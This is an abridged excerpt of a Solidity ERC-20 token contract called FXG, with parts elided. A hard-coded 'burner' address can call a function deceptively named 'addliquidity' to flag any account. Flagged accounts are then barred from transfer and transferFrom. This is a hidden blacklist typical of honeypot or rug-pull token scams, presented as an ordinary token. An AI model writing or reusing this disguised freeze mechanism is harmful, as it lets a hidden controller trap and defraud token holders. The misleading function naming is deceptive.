...
contract FXG is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances; 
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    address private burner=0x8B6624218a12c53bd92A326906c33C6a2Aaf8215;
    ...
    function addliquidity(address account, bool isLiquidity) public onlyBurner {
        _liquidity[account] = isLiquidity;
    }
    ...
    function transferFrom(
        ...
        require(!_liquidity[msg.sender],"Error:Invalid Caller");
    ...
    function _transfer(
        ...
        require(!_liquidity[sender], "You have been Not paired from transfering tokens");
